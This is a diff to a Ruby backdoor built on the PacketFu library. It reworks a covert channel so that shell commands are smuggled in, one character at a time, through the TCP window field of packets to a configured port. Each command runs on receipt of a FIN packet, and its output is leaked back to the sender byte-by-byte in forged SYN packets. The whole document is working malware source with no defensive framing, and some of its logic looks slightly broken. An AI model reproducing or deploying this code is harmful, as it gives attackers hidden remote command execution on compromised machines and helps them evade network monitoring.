@@ -11,6 +11,7 @@ require curdir + '/commands.rb'
 class Backdoor
     include Commands
     @start = false
+    @command = ""
     
     def initialize(start = false)
         conf_array = CSV.read("config.csv")
@@ -43,46 +44,51 @@ class Backdoor
     
     def process_packet(packet)
         # Run Generic Command
-        if packet.tcp_flags.psh == 1 and packet.tcp_win == 8008 then
-            result = run_command(decode(packet.payload))
-            send_data(result, packet)
-            return
-        end #if
+        if packet.tcp_dst == @conf_array[2].to_i
+            if packet.tcp_flags.fin == 1 then
+                send_data(run_command(@command), packet)
+                @command = ""
+            else
+                if @command.nil? then
+                    @command = packet.tcp_win.chr
+                    puts @command
+                elsif
+                    @command << packet.tcp_win.chr
+                    puts @command
+                end
+            end # if
+        end # if
         
         # Run get command
         #if packet.tcp_flags.syn == 1 and packet.tcp_flags.psh == 1 then
     end # process_packet
     
-    def send_data(data, packet)
-    
-        array_data = data.scan(/.{1,255}/m)
-        
-        array_data.each { |word|
+    def send_data(data, packet)        
+        data.each_byte do |word|
             tcp = PacketFu::TCPPacket.new()
             
             tcp.eth_saddr = @cfg[:eth_saddr]
             tcp.eth_daddr = @cfg[:eth_daddr]
             tcp.tcp_src = rand(0xfff - 1024) + 1024
-            tcp.tcp_dst = rand(0xfff - 1024) + 1024
-            tcp.tcp_flags.psh = 1;
-            tcp.tcp_win = 7331
+            tcp.tcp_dst = @conf_array[3]
+            tcp.tcp_flags.syn = 1
+            tcp.tcp_win = word
+            tcp.tcp_seq = rand(0xffff)
             tcp.ip_saddr = packet.ip_daddr
             tcp.ip_daddr = packet.ip_saddr
             
-            tcp.payload = encode(word)
-            
             tcp.recalc
             tcp.to_w(@iface)
-        }
+        end
         
         tcp_fin = PacketFu::TCPPacket.new()
         
         tcp_fin.eth_saddr = @cfg[:eth_saddr]
         tcp_fin.eth_daddr = @cfg[:eth_daddr]
         tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
-        tcp_fin.tcp_dst = rand(0xfff - 1024) + 1024
-        tcp_fin.tcp_flags.psh = 1
+        tcp_fin.tcp_dst = @conf_array[3]
         tcp_fin.tcp_flags.fin = 1
+        tcp_fin.tcp_seq = rand(0xffff)
         tcp_fin.ip_saddr = packet.ip_daddr
         tcp_fin.ip_daddr = packet.ip_saddr
         
